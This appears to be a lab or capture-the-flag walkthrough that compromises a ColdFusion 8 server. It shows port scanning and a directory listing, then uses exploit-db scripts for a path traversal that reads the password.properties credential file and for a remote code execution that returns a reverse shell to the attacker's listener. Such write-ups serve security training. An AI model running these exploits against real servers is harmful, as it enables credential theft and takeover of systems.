# ColdFusion

## Nmap

```sh
my@attack:~$ sudo nmap 10.129.244.173 -p- --open -sC
```

```output title="Output" hl_lines="8"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 10:31 +03
Nmap scan report for 10.129.244.173
Host is up (0.14s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 345.66 seconds
```

## Directory Listing

```sh
my@attack:~$ curl -s 'http://10.129.244.173:8500/CFIDE/' -L | html2text
```

```output title="Output" hl_lines="11"
# Index of /CFIDE/



* * *


    [Parent ..](..)                                              _dir_   03/22/17 08:52 μμ
    [Application.cfm](Application.cfm)                                       1151   03/18/08 11:06 πμ
    [adminapi/](adminapi/)                                              _dir_   03/22/17 08:53 μμ
    [administrator/](administrator/)                                         _dir_   03/22/17 08:55 μμ
    [classes/](classes/)                                               _dir_   03/22/17 08:52 μμ
    [componentutils/](componentutils/)                                        _dir_   03/22/17 08:52 μμ
    [debug/](debug/)                                                 _dir_   03/22/17 08:52 μμ
    [images/](images/)                                                _dir_   03/22/17 08:52 μμ
    [install.cfm](install.cfm)                                          12077   03/18/08 11:06 πμ
    [multiservermonitor-access-policy.xml](multiservermonitor-access-policy.xml)                   278   03/18/08 11:07 πμ
    [probe.cfm](probe.cfm)                                            30778   03/18/08 11:06 πμ
    [scripts/](scripts/)                                               _dir_   03/22/17 08:52 μμ
    [wizards/](wizards/)                                               _dir_   03/22/17 08:52 μμ


* * *
```

## SearchSploit

```sh
my@attack:~$ searchsploit adobe coldfusion
```

```output title="Output" hl_lines="5 12"
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                               | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                              | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                           | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                    | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                     | cfm/webapps/33168.txt
Adobe ColdFusion versions 2018_15 (and earlier) and 2021_5 and earlier - Arbitrary File Read                                              | multiple/webapps/51875.py
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

## [Path Traversal](https://nvd.nist.gov/vuln/detail/cve-2010-2861)

```sh
my@attack:~$ python2 /usr/share/exploitdb/exploits/multiple/remote/14641.py 10.129.244.173 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

## [RCE](https://nvd.nist.gov/vuln/detail/CVE-2009-2265)

```python title="50057.py" linenums="69"
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.15.37'
    lport = 4444
    rhost = "10.129.244.173"
    rport = 8500
    filename = uuid.uuid4().hex
```

```sh
my@attack:~$ python3 /usr/share/exploitdb/exploits/cfm/webapps/50057.py
```
